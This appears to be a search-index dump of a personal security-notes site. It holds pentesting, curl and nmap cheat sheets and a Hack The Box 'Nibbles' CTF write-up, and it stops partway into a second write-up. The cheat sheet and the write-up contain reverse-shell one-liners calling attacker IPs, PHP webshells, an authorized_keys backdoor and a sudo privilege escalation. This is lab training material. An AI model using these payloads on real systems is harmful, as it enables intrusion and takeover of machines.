{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome to itsec.aria-network.com","text":"<p>This is a page with itsec content. It is not intended for the public. So there is no guarantee that everything is correct. Especially when it comes to grammar and spelling. In general, it's notes that have been rewritten in a blog format. </p> <p>Enjoy</p>"},{"location":"about/","title":"O faucibus diriguit","text":""},{"location":"about/#vulneribus-video","title":"Vulneribus video","text":"<p>Lorem markdownum flexi oculosque. Non profanus penatigero sublimes, profundi harenas; amor dixerunt, et consilii virgineosque somnos modo ducere Phrygiis Triones habebit.</p> <pre><code>file(raw + inputNosql, 2);\nbank_windows_view.multithreadingDoubleVci.dvd(ripcordingType, dot_program +\n        pppoe_finder_flash);\nif (bin_display_delete - wordartDigital - memoryDayFile) {\n    os_imap(autoresponder_query_degauss, ruby);\n    box_core *= cameraFlopsPinterest - webResponsiveBios + 5;\n    upAd -= 2;\n} else {\n    shiftDirectx = compressionBoot;\n    passive.bar = cpc_system_command(-5, refreshWeb);\n}\nunit_cross_user = name_dual_alu.dataCopy(riscFpuBoot);\n</code></pre> <p>Ululatibus miseram decimum: sum sacrata versuta Aegaeo faece dictis! Tempore senili; per passim manebo dote ubi vir parte Thyoneus fronde; ventos cum sororis raptam; iam illa?</p> <ol> <li>Fatemur in mora Io tuae altius</li> <li>Aspera materno spectatas fatum libera ulla clausis</li> <li>Tamen ferae undas variari quotiens inde dabo</li> <li>Huc in</li> <li>Dicunt oculis</li> <li>Spem umbras de penates</li> </ol>"},{"location":"about/#iratus-pro-mandat-stant-templa","title":"Iratus pro mandat stant templa","text":"<p>Parvumque sollemni, Gangetica spatium. Nec cecidere parva. Dis Ionio et Saturnia adspexit in quam mercibus retinebat, arbore, belli vinci cecidit praeter. Vimine oppugnare cadmus illam Sparte, inimica montes tum auditas, hunc foribusque venit est dum exteriusque iuvencam.</p> <ul> <li>Patriam faciem</li> <li>Arma mollito concidis colonus successor viderat tibi</li> <li>Clade mihi est omne</li> </ul> <p>Cogi timorem dumque humus; aeternus manus; fuga quereris anno inveniunt ab forsitan contraque premit sacra. Tibi quod? Urbs Arethusa sua largis fixo, ego ornum taedasque superest. Est ocius eo trementem integer pedum manus adest imagine auxilium: ore suos fluitque. Parte laesit futura premit?</p> <p>Concutit adsis, cono quam nam; ambos ferrum die volenti sacerdos quo est, iners iam movet nec. Amphrysos minata! Iura deorum percussus pavetque et arma illinc tamen nepotemque Aegides Lycaon.</p>"},{"location":"cheatsheets/cheatsheet_basic_linux_tools/","title":"Basic Linux Tools","text":"Command Description General <code>sudo openvpn user.ovpn</code> Connect to VPN <code>ifconfig</code>/<code>ip a</code> Show our IP address <code>netstat -rn</code> Show networks accessible via the VPN <code>ssh user@10.10.10.10</code> SSH to a remote server <code>ftp 10.129.42.253</code> FTP to a remote server tmux <code>tmux</code> Start tmux Ctrl+B Ctrl+C tmux: new window Ctrl+B 1 tmux: switch to window (<code>1</code>) Ctrl+% tmux: split pane vertically Ctrl+\" tmux: split pane horizontally Ctrl+Right tmux: switch to the right pane Vim <code>vim file</code> vim: open <code>file</code> with vim <code>esc+i</code> vim: enter <code>insert</code> mode <code>esc</code> vim: back to <code>normal</code> mode <code>x</code> vim: Cut character <code>dw</code> vim: Cut word <code>dd</code> vim: Cut full line <code>yw</code> vim: Copy word <code>yy</code> vim: Copy full line <code>p</code> vim: Paste <code>:1</code> vim: Go to line number 1. <code>:w</code> vim: Write the file 'i.e. save' <code>:q</code> vim: Quit <code>:q!</code> vim: Quit without saving <code>:wq</code> vim: Write and quit"},{"location":"cheatsheets/cheatsheet_basic_linux_tools/#_1","title":"Basic Linux Tools","text":""},{"location":"cheatsheets/cheatsheet_basic_pentesting/","title":"Pentesting","text":"Command Description Service Scanning <code>nmap 10.129.42.253</code> Run nmap on an IP <code>nmap -sV -sC -p- 10.129.42.253</code> Run an nmap script scan on an IP <code>locate scripts/citrix</code> List various available nmap scripts <code>nmap --script smb-os-discovery.nse -p445 10.10.10.40</code> Run an nmap script on an IP <code>netcat 10.10.10.10 22</code> Grab banner of an open port <code>smbclient -N -L \\\\\\\\10.129.42.253</code> List SMB Shares <code>smbclient \\\\\\\\10.129.42.253\\\\users</code> Connect to an SMB share <code>snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0</code> Scan SNMP on an IP <code>onesixtyone -c dict.txt 10.129.42.254</code> Brute force SNMP secret string Web Enumeration <code>gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt</code> Run a directory scan on a website <code>gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt</code> Run a sub-domain scan on a website <code>curl -IL https://www.inlanefreight.com</code> Grab website banner <code>whatweb 10.10.10.121</code> List details about the webserver/certificates <code>curl 10.10.10.121/robots.txt</code> List potential directories in <code>robots.txt</code> Ctrl+U View page source (in Firefox) Public Exploits <code>searchsploit openssh 7.2</code> Search for public exploits for a web application <code>msfconsole</code> MSF: Start the Metasploit Framework <code>search exploit eternalblue</code> MSF: Search for public exploits in MSF <code>use exploit/windows/smb/ms17_010_psexec</code> MSF: Start using an MSF module <code>show options</code> MSF: Show required options for an MSF module <code>set RHOSTS 10.10.10.40</code> MSF: Set a value for an MSF module option <code>check</code> MSF: Test if the target server is vulnerable <code>exploit</code> MSF: Run the exploit on the target server is vulnerable Using Shells <code>nc -lvnp 1234</code> Start a <code>nc</code> listener on a local port <code>bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.10.10/1234 0&gt;&amp;1'</code> Send a reverse shell from the remote server <code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\\|/bin/sh -i 2&gt;&amp;1\\|nc 10.10.10.10 1234 &gt;/tmp/f</code> Another command to send a reverse shell from the remote server <code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\\|/bin/bash -i 2&gt;&amp;1\\|nc -lvp 1234 &gt;/tmp/f</code> Start a bind shell on the remote server <code>nc 10.10.10.1 1234</code> Connect to a bind shell started on the remote server <code>python -c 'import pty; pty.spawn(\"/bin/bash\")'</code> Upgrade shell TTY (1) Ctrl+Z then <code>stty raw -echo</code> then <code>fg</code> then <code>enter</code> twice Upgrade shell TTY (2) <code>echo \"&lt;?php system(\\$_GET['cmd']);?&gt;\" &gt; /var/www/html/shell.php</code> Create a webshell php file <code>curl http://SERVER_IP:PORT/shell.php?cmd=id</code> Execute a command on an uploaded webshell Privilege Escalation <code>./linpeas.sh</code> Run <code>linpeas</code> script to enumerate remote server <code>sudo -l</code> List available <code>sudo</code> privileges <code>sudo -u user /bin/echo Hello World!</code> Run a command with <code>sudo</code> <code>sudo su -</code> Switch to root user (if we have access to <code>sudo su</code>) <code>sudo su user -</code> Switch to a user (if we have access to <code>sudo su</code>) <code>ssh-keygen -f key</code> Create a new SSH key <code>echo \"ssh-rsa AAAAB...SNIP...M= user@parrot\" &gt;&gt; /root/.ssh/authorized_keys</code> Add the generated public key to the user <code>ssh root@10.10.10.10 -i key</code> SSH to the server with the generated private key Transferring Files <code>python3 -m http.server 8000</code> Start a local webserver <code>wget http://10.10.14.1:8000/linpeas.sh</code> Download a file on the remote server from our local machine <code>curl http://10.10.14.1:8000/linenum.sh -o linenum.sh</code> Download a file on the remote server from our local machine <code>scp linenum.sh user@remotehost:/tmp/linenum.sh</code> Transfer a file to the remote server with <code>scp</code> (requires SSH access) <code>base64 shell -w 0</code> Convert a file to <code>base64</code> <code>echo f0VMR...SNIO...InmDwU \\| base64 -d &gt; shell</code> Convert a file from <code>base64</code> back to its orig <code>md5sum shell</code> Check the file's <code>md5sum</code> to ensure it converted correctlyBasic Tools"},{"location":"cheatsheets/cheatsheet_curl/","title":"curl","text":"Command Description <code>curl http://inlanefreight.com</code> <code>GET</code> request with <code>cURL</code> <code>curl http://inlanefreight.com -v</code> Verbose <code>GET</code> request with <code>cURL</code> <code>curl http://admin:password@inlanefreight.com/ -vvv</code> <code>cURL</code> Basic Auth login <code>curl -u admin:password http://inlanefreight.com/ -vvv</code> Alternate <code>cURL</code> Basic Auth login <code>curl -u admin:password -L http://inlanefreight.com/</code> <code>cURL</code> Basic Auth login, follow redirection <code>curl -u admin:password 'http://inlanefreight.com/search.php?port_code=us'</code> <code>cURL</code> GET request with parameter <code>curl -d 'username=admin&amp;password=password' -L http://inlanefreight.com/login.php</code> POST request with <code>cURL</code> <code>curl -d 'username=admin&amp;password=password' -L http://inlanefreight.com/login.php -v</code> Debugging with <code>cURL</code> <code>curl -d 'username=admin&amp;password=password' -L --cookie-jar /dev/null http://inlanefreight.com/login.php -v</code> Cookie usage with <code>cURL</code> <code>curl -d 'username=admin&amp;password=password' -L --cookie-jar cookies.txt http://inlanefreight.com/login.php</code> <code>cURL</code> with cookie file <code>curl -H 'Content-Type: application/json' -d '{ \"username\" : \"admin\", \"password\" : \"password\" }'</code> <code>cURL</code> specify content type <code>curl -X OPTIONS http://inlanefreight.com/ -vv</code> <code>cURL</code> OPTIONS request <code>curl -X PUT -d @test.txt http://inlanefreight.com/test.txt -vv</code> File upload with <code>cURL</code> <code>curl -X DELETE http://inlanefreight.com/test.txt -vv</code> DELETE method with <code>cURL</code>"},{"location":"cheatsheets/cheatsheet_nmap/","title":"nmap","text":""},{"location":"cheatsheets/cheatsheet_nmap/#scanning-options","title":"Scanning Options","text":"Nmap Option Description <code>10.10.10.0/24</code> Target network range. <code>-sn</code> Disables port scanning. <code>-Pn</code> Disables ICMP Echo Requests <code>-n</code> Disables DNS Resolution. <code>-PE</code> Performs the ping scan by using ICMP Echo Requests against the target. <code>--packet-trace</code> Shows all packets sent and received. <code>--reason</code> Displays the reason for a specific result. <code>--disable-arp-ping</code> Disables ARP Ping Requests. <code>--top-ports=&lt;num&gt;</code> Scans the specified top ports that have been defined as most frequent. <code>-p-</code> Scan all ports. <code>-p22-110</code> Scan all ports between 22 and 110. <code>-p22,25</code> Scans only the specified ports 22 and 25. <code>-F</code> Scans top 100 ports. <code>-sS</code> Performs an TCP SYN-Scan. <code>-sA</code> Performs an TCP ACK-Scan. <code>-sU</code> Performs an UDP Scan. <code>-sV</code> Scans the discovered services for their versions. <code>-sC</code> Perform a Script Scan with scripts that are categorized as \"default\". <code>--script &lt;script&gt;</code> Performs a Script Scan by using the specified scripts. <code>-O</code> Performs an OS Detection Scan to determine the OS of the target. <code>-A</code> Performs OS Detection, Service Detection, and traceroute scans. <code>-D RND:5</code> Sets the number of random Decoys that will be used to scan the target. <code>-e</code> Specifies the network interface that is used for the scan. <code>-S 10.10.10.200</code> Specifies the source IP address for the scan. <code>-g</code> Specifies the source port for the scan. <code>--dns-server &lt;ns&gt;</code> DNS resolution is performed by using a specified name server."},{"location":"cheatsheets/cheatsheet_nmap/#output-options","title":"Output Options","text":"Nmap Option Description <code>-oA filename</code> Stores the results in all available formats starting with the name of \"filename\". <code>-oN filename</code> Stores the results in normal format with the name \"filename\". <code>-oG filename</code> Stores the results in \"grepable\" format with the name of \"filename\". <code>-oX filename</code> Stores the results in XML format with the name of \"filename\"."},{"location":"cheatsheets/cheatsheet_nmap/#performance-options","title":"Performance Options","text":"Nmap Option Description <code>--max-retries &lt;num&gt;</code> Sets the number of retries for scans of specific ports. <code>--stats-every=5s</code> Displays scan's status every 5 seconds. <code>-v/-vv</code> Displays verbose output during the scan. <code>--initial-rtt-timeout 50ms</code> Sets the specified time value as initial RTT timeout. <code>--max-rtt-timeout 100ms</code> Sets the specified time value as maximum RTT timeout. <code>--min-rate 300</code> Sets the number of packets that will be sent simultaneously. <code>-T &lt;0-5&gt;</code> Specifies the specific timing template."},{"location":"ctf-boxes/htb/easy/nibbles/nibbles/","title":"Nibbles","text":""},{"location":"ctf-boxes/htb/easy/nibbles/nibbles/#enumeration","title":"Enumeration","text":""},{"location":"ctf-boxes/htb/easy/nibbles/nibbles/#nmap","title":"nmap","text":"initialextended <pre><code># Nmap 7.92 scan initiated Sat Sep 18 01:45:07 2021 as: nmap -sC -sV -oA nmap/initial_scan 10.129.157.153\nNmap scan report for 10.129.157.153\nHost is up (0.038s latency).\nNot shown: 998 closed tcp ports (conn-refused)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)\n|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)\n|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-title: Site doesn't have a title (text/html).\n|_http-server-header: Apache/2.4.18 (Ubuntu)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Sat Sep 18 01:45:16 2021 -- 1 IP address (1 host up) scanned in 8.75 seconds\n</code></pre> <pre><code># Nmap 7.92 scan initiated Sat Sep 18 01:52:43 2021 as: nmap -p- -oA nmap/extended_scan 10.129.157.153\nNmap scan report for 10.129.157.153\nHost is up (0.040s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\n# Nmap done at Sat Sep 18 01:53:01 2021 -- 1 IP address (1 host up) scanned in 17.83 seconds\n</code></pre>"},{"location":"ctf-boxes/htb/easy/nibbles/nibbles/#manual-footprinting","title":"Manual footprinting","text":""},{"location":"ctf-boxes/htb/easy/nibbles/nibbles/#banner-grabbing","title":"Banner grabbing","text":"<pre><code>bonzo@srv001:/opt/Documentation/CTF/HTB/Easy/nibbles&gt; curl -IL http://10.129.236.159/nibbleblog\nHTTP/1.1 301 Moved Permanently\nDate: Sat, 18 Sep 2021 18:48:10 GMT\nServer: Apache/2.4.18 (Ubuntu)\nLocation: http://10.129.236.159/nibbleblog/\nContent-Type: text/html; charset=iso-8859-1\n\nHTTP/1.1 200 OK\nDate: Sat, 18 Sep 2021 18:48:10 GMT\nServer: Apache/2.4.18 (Ubuntu)\nSet-Cookie: PHPSESSID=u4310id4atuch91scaqnm981s6; path=/\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\nCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\nPragma: no-cache\nContent-Type: text/html; charset=UTF-8\n</code></pre>"},{"location":"ctf-boxes/htb/easy/nibbles/nibbles/#whatweb","title":"whatweb","text":"<pre><code>bonzo@srv001:/opt/Documentation/CTF/HTB/Easy/nibbles&gt; whatweb http://10.129.236.159/nibbleblog\n\nhttp://10.129.236.159/nibbleblog [301 Moved Permanently] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.236.159], RedirectLocation[http://10.129.236.159/nibbleblog/], Title[301 Moved Permanently]\n\nhttp://10.129.236.159/nibbleblog/ [200 OK] Apache[2.4.18], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.236.159], JQuery, MetaGenerator[Nibbleblog], PoweredBy[Nibbleblog], Script, Title[Nibbles - Yum yum]\n</code></pre>"},{"location":"ctf-boxes/htb/easy/nibbles/nibbles/#ssl","title":"SSL","text":"<p>Not applicable</p>"},{"location":"ctf-boxes/htb/easy/nibbles/nibbles/#robotstxt","title":"robots.txt","text":"<p>No robots.txt</p>"},{"location":"ctf-boxes/htb/easy/nibbles/nibbles/#source-code","title":"Source code","text":""},{"location":"ctf-boxes/htb/easy/nibbles/nibbles/#other","title":"Other","text":"<p>Found version displaying /nibbleblog/README</p> <p></p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;users&gt;\n&lt;user username=\"admin\"&gt;\n&lt;id type=\"integer\"&gt;0&lt;/id&gt;\n&lt;session_fail_count type=\"integer\"&gt;0&lt;/session_fail_count&gt;\n&lt;session_date type=\"integer\"&gt;1514544131&lt;/session_date&gt;\n&lt;/user&gt;\n&lt;blacklist type=\"string\" ip=\"10.10.10.1\"&gt;\n&lt;date type=\"integer\"&gt;1512964659&lt;/date&gt;\n&lt;fail_count type=\"integer\"&gt;1&lt;/fail_count&gt;\n&lt;/blacklist&gt;\n&lt;/users&gt;\n</code></pre> <p>We got username <code>admin</code>.</p>"},{"location":"ctf-boxes/htb/easy/nibbles/nibbles/#web-footprinting","title":"Web Footprinting","text":""},{"location":"ctf-boxes/htb/easy/nibbles/nibbles/#directory","title":"Directory","text":"<p>Since we have the directory <code>nibbleblog</code> from the source code, we do a dir scan on the directory instead of the main directory (looking for php,html and txt as well).</p> <pre><code>bonzo@srv001:/opt/Documentation/CTF/HTB/Easy/nibbles&gt; gobuster dir -u http://10.129.236.159/nibbleblog -w /opt/SecLists/Discovery/Web-Content/raft-small-directories.txt -o gobuster/dirscan -x php,txt,html\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.129.236.159/nibbleblog\n[+] Threads:        10\n[+] Wordlist:       /opt/SecLists/Discovery/Web-Content/raft-small-directories.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Extensions:     php,txt,html\n[+] Timeout:        10s\n===============================================================\n2021/09/18 21:33:21 Starting gobuster\n===============================================================\n/admin (Status: 301)\n/admin.php (Status: 200)\n/plugins (Status: 301)\n/themes (Status: 301)\n/feed.php (Status: 200)\n/install.php (Status: 200)\n/content (Status: 301)\n/languages (Status: 301)\n/sitemap.php (Status: 200)\n/index.php (Status: 200)\n/update.php (Status: 200)\n/README (Status: 200)\n/COPYRIGHT.txt (Status: 200)\n/LICENSE.txt (Status: 200)\n===============================================================\n2021/09/18 21:37:52 Finished\n===============================================================\n</code></pre> <p>Interesting directories: /admin</p>"},{"location":"ctf-boxes/htb/easy/nibbles/nibbles/#subdomains-with-dns","title":"Subdomains (with DNS)","text":"<p>Not applicable</p>"},{"location":"ctf-boxes/htb/easy/nibbles/nibbles/#subdomains-vhost","title":"Subdomains (vhost)","text":"<p>Not applicable</p>"},{"location":"ctf-boxes/htb/easy/nibbles/nibbles/#exploitation-research","title":"Exploitation Research","text":""},{"location":"ctf-boxes/htb/easy/nibbles/nibbles/#searchsploit","title":"searchsploit","text":"<pre><code>\u250c\u2500[root@parrot]\u2500[/home/user]\n\u2514\u2500\u2500\u257c #searchsploit nibbleblog\n---------------------------------------------- ---------------------------------\n Exploit Title                                |  Path\n---------------------------------------------- ---------------------------------\nNibbleblog 3 - Multiple SQL Injections        | php/webapps/35865.txt\nNibbleblog 4.0.3 - Arbitrary File Upload (Met | php/remote/38489.rb\n---------------------------------------------- ---------------------------------\nShellcodes: No Results\nPapers: No Results\n</code></pre> <p>RCE exploit detected. Authorization required. metasploit exploit available as well.  https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-6967</p>"},{"location":"ctf-boxes/htb/easy/nibbles/nibbles/#exploitation","title":"Exploitation","text":"<ul> <li> <p>http://10.129.200.170/nibbleblog/admin.php : user: admin | pass: nibbles</p> </li> <li> <p>Uploading test payload thru the my_image plugin.</p> <p><code>&lt;?php echo system($_REQUEST['cmd']); ?&gt;</code></p> <p></p> </li> <li> <p>The plugin saves the \"image\" in the content/private/plugins/my_images folder with the name image.php</p> <p></p> </li> <li> <p>Now we upload the php reverse shell  <pre><code>&lt;?php system (\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.188 1234 &gt;/tmp/f\"); ?&gt;`\n</code></pre></p> </li> <li> <p>On the attacker machine we start a stabilized shell</p> <pre><code>stty raw -echo; (echo \"stty$(stty -a | awk -F ';' '{print $2 $3}' | head -n 1)\";echo \"\"; echo 'python3 -c \"import pty;pty.spawn(\\\"/bin/bash\\\")\"'; echo reset; echo ;cat) | nc -lvnp 1234\n</code></pre> </li> <li> <p>In the home directory we find the user nibbler  and the user flag</p> <pre><code>nibbler@Nibbles:/home/nibbler$ ls -al \nnibbler@Nibbles:/home/nibbler$ ls -al\ntotal 20\ndrwxr-xr-x 3 nibbler nibbler 4096 Mar 12  2021 .\ndrwxr-xr-x 3 root    root    4096 Dec 10  2017 ..\n-rw------- 1 nibbler nibbler    0 Dec 29  2017 .bash_history\ndrwxrwxr-x 2 nibbler nibbler 4096 Dec 10  2017 .nano\n-r-------- 1 nibbler nibbler 1855 Dec 10  2017 personal.zip\n-r-------- 1 nibbler nibbler   33 Mar 12  2021 user.txt\nnibbler@Nibbles:/home/nibbler$ cat user.txt \n79c03865431abf47b90ef24b9695e148\n</code></pre> </li> <li> <p>Interesting file is personal.zip, unzip it. <code>sudo -l</code> shows us wie can execute the monitor.sh with root privileges</p> <pre><code>nibbler@Nibbles:/home/nibbler$ unzip personal.zip \nArchive:  personal.zip\n    creating: personal/\n    creating: personal/stuff/\n    inflating: personal/stuff/monitor.sh  \nnibbler@Nibbles:/home/nibbler$ sudo -l\nMatching Defaults entries for nibbler on Nibbles:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser nibbler may run the following commands on Nibbles:\n    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh\nnibbler@Nibbles:/home/nibbler$\n</code></pre> </li> </ul>"},{"location":"ctf-boxes/htb/easy/nibbles/nibbles/#create-ssh-keys-and-login-with-ssh","title":"Create ssh keys and login with ssh","text":"<p>Since the reverse shell is extremely unstable, we create a ssh shell.</p> <ul> <li> <p>Create a private-public key pair on the attacker machine  </p> <pre><code>bonzo@srv001:/opt/Documentation/CTF/HTB/Easy/nibbles&gt; ssh-keygen -f keys\nGenerating public/private rsa key pair.\nEnter passphrase (empty for no passphrase): \nEnter same passphrase again: \nYour identification has been saved in keys\nYour public key has been saved in keys.pub\nThe key fingerprint is:\nSHA256:XextmEmLuQnFrvYikrv7ObpB/ucKIig78Do2Pp1PRqo bonzo@srv001.bonzonet.test\nThe key's randomart image is:\n+---[RSA 3072]----+\n|                 |\n|         . .     |\n|          o +    |\n|         + * *   |\n|    ..  S = * o  |\n|o  oo    o o .   |\n|=.o.=+  o o      |\n|+*o+=+ooo.       |\n|=Eo BX=*...      |\n+----[SHA256]-----+\n</code></pre> </li> <li> <p>Create the folder <code>.ssh</code> in the folder <code>/home/nibbler</code> on the victim machine and create the authorized_keys file</p> <pre><code>echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0TbaBlftemYs6DxLDOeRRcpPsi2BwjvbqebbE48rXwuucGB3moCuZepxpzxkUlFtn/JsSLOfX/WGH6AaSeoQrEOIgtyHgZEsrM6QbGeZdQbxmoX6y1c3iZ2jj6jUZ92jIC/xMHIyvxqbG+um7Dl/j0dqj1dwInrswYaCmoPxpTPUJoQ5ExgMTDby3ZPTajLNrwqwIaQRDRShFXaOeiB920g9FeUmU8x0bYCSkw6UIy5VwQFzPD4+fiJ2BlGK+7Bcz6gDMlnZyNOSWmMzV+oAo8k38p21KqJkJ2wanj0jmLOx6nmFJGoPY3IqcbrEGbTm+kD61Kxby2JCUDIZM9in/psHxkwF/L91T/SRUhjd2ABXijAmY1TuVnha4NNSwiSC1CCxRq4/JKAuO6Qvv1pSyqB/dD5GcB8s97UAqyZ18XUEjG+9C0Heq8OxRNdZBtG+4CwjClmXQ6PZswPqKQLNl13BDxaBLoyevTILYlsiINBNFz5bM+qQP/XXu09yrk78= bonzo@srv001.bonzonet.test\" &gt;&gt; authorized_keys\n</code></pre> </li> <li> <p>change the ownership of the <code>keys</code> file on the attacker machine a connect via ssh</p> <pre><code>bonzo@srv001:/opt/Documentation/CTF/HTB/Easy/nibbles&gt; ssh nibbler@10.129.200.170 -i key \nThe authenticity of host '10.129.200.170 (10.129.200.170)' can't be established.\nECDSA key fingerprint is SHA256:6Xub2G5qowxZGyUBvUK4Y0prznGD5J2UyeMhJSdCZGw.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.129.200.170' (ECDSA) to the list of known hosts.\nWelcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-104-generic x86_64)\n\n* Documentation:  https://help.ubuntu.com\n* Management:     https://landscape.canonical.com\n* Support:        https://ubuntu.com/advantage\n\n291 packages can be updated.\n197 updates are security updates.\n... SNIP\n</code></pre> </li> </ul>"},{"location":"ctf-boxes/htb/easy/nibbles/nibbles/#privilege-escalation","title":"Privilege Escalation","text":"<ul> <li> <p>With <code>sudo -l</code> we check if there are any commands we can execute with root privileges without been asked for a password</p> <pre><code>nibbler@Nibbles:~/personal/stuff$ sudo -l\nMatching Defaults entries for nibbler on Nibbles:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser nibbler may run the following commands on Nibbles:\n    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh\n</code></pre> </li> <li> <p>We can see that <code>monitor.sh</code> can be executed without password (<code>monitor.sh</code> is in the <code>personal.zip</code> file in the home folder of the <code>nibbler</code>user )</p> </li> <li> <p>We edit the <code>monitor.sh</code> adding a simple <code>echo \"/bin/bash -i\" &gt;&gt; monitor.sh</code> </p> </li> <li> <p>Executing <code>sudo ./monitor.sh</code> in the folder where the <code>monitor.sh</code> resides, we get the root shell</p> <pre><code>nibbler@Nibbles:~/personal/stuff$ sudo ./monitor.sh \nroot@Nibbles:~/personal/stuff# \n</code></pre> </li> <li> <p>We get the root flag from the root folder</p> <pre><code>root@Nibbles:~/personal/stuff# cd /root/\nroot@Nibbles:/root# ls -al\ntotal 28\ndrwx------  4 root root 4096 Mar 12  2021 .\ndrwxr-xr-x 23 root root 4096 May 24 12:11 ..\n-rw-------  1 root root    0 Dec 29  2017 .bash_history\n-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc\ndrwx------  2 root root 4096 Dec 10  2017 .cache\ndrwxr-xr-x  2 root root 4096 Dec 10  2017 .nano\n-rw-r--r--  1 root root  148 Aug 17  2015 .profile\n-rwx------  1 root root   33 Mar 12  2021 root.txt\nroot@Nibbles:/root# cat root.txt \nde5e5d6619862a8aa5b9b212314e0cdd\nroot@Nibbles:/root# \n</code></pre> </li> </ul>"},{"location":"ctf-boxes/htb/easy/nibbles/nibbles/#loot","title":"Loot","text":"<p>MYIP: 10.10.15.173</p> <p>RHOST: 10.129.157.153</p> <p>OS: Ubuntu 16.04.7 LTS (Xenial Xerus)</p>"},{"location":"ctf-boxes/htb/easy/nibbles/nibbles/#services","title":"Services","text":"Name Version OpenSSH 7.2p2 Apache 2.4.18 <p>Found interesting subdirectory: /nibbleblog/</p>"},{"location":"ctf-boxes/htb/easy/nibbles/nibbles/#apps","title":"Apps","text":"Name Version URL Exploit nibbleblog v 4.0.3 https://www.nibbleblog.com/ yes <p>Found interesting subdirectory: /nibbleblog/</p> <p>Found interesting subdirectories and files:  /nibbleblog/admin, /nibbleblog/content/, /nibbleblog/plugins/, /nibbleblog/themes/, /nibbleblog/languages/,  /nibbleblog/README</p>"},{"location":"ctf-boxes/htb/easy/nibbles/nibbles/#users","title":"Users","text":"username password other admin nibbles got through manually out several passwords"},{"location":"ctf-boxes/htb/easy/nibbles/nibbles/#flags","title":"Flags","text":"Flag Value user 79c03865431abf47b90ef24b9695e148 root de5e5d6619862a8aa5b9b212314e0cdd"},{"location":"ctf-boxes/thm/easy/easypeasy/easypeasy/","title":"EasyPeasy","text":"<p>Important Notice</p> <p>To keep it spoiler-free, all important information to solve the ctf     is either pixelated or encoded with ROT-13. </p>"},{"location":"ctf-boxes/thm/easy/easypeasy/easypeasy/#overview","title":"Overview","text":"<p>The room starts with a rather easy nmap and directory enumeration. I've chosen <code>ffuf</code> instead of <code>gobuster</code> because <code>ffuf</code> has the ability to check all subfolders, up to a defined depth, automatically. There are a nginx server on a standard port <code>80</code> and another apache webserver on a non-standard port, as well as an ssh server on a non-standard port. After identifying all the folders on both web servers, all the <code>robots.txt</code>and and <code>index.html</code> files are checked, source included and some encoded strings are found. One of the string is a sha256-like hash but it's not really <code>sha256</code>. After finding the correct cryptographic function it reveals a secret folder. In the secret folder a picture inside a picture is found and with some <code>steganography tools</code> and a password we cracked earlier, an username and a binary representation of a string is found. Converting the binary string we get the password and we can log in via ssh as that user. We get the user flag and with the hint we convert the <code>rotated</code> string to the correct flag. Using <code>linpeas.sh</code> we find a cronjob running as root. Editing the file the cronjob runs and adding a reverse shell, we get <code>root</code> and finally the root flag. </p>"},{"location":"ctf-boxes/thm/easy/easypeasy/easypeasy/#information-gathering","title":"Information Gathering","text":""},{"location":"ctf-boxes/thm/easy/easypeasy/easypeasy/#nmap","title":"nmap","text":"Quick open port scanExtensive Version And Script Scan On Selected Ports <pre><code>\u2514\u2500# nmap -p- 10.10.24.106\nStarting Nmap 7.92 ( https://nmap.org ) at 2021-11-30 19:11 CET\nNmap scan report for 10.10.24.106\nHost is up (0.053s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT      STATE SERVICE\n80/tcp    open  http\n6498/tcp  open  unknown\n65524/tcp open  unknown\n</code></pre> <pre><code>\u2514\u2500# nmap -sC -sV 10.10.24.106 -p80,6498,65524\nStarting Nmap 7.92 ( https://nmap.org ) at 2021-11-30 19:14 CET\nNmap scan report for 10.10.24.106\nHost is up (0.044s latency).\n\nPORT      STATE SERVICE VERSION\n80/tcp    open  http    